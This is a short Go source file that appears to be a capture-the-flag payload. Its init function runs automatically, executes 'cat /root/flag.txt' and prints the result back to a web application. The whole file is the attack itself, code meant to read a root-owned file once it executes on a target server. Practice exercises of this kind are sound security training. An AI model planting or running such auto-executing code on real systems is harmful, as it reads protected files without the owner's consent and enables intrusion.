package main

import (
	"fmt"
	"os/exec"
)

func init() {
	// This will execute the command to read the flag.
	cmd := exec.Command("cat", "/root/flag.txt")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error reading flag:", err)
		return
	}

	// Print the flag or output to the web application
	fmt.Printf("Flag: %s\n", output)
}

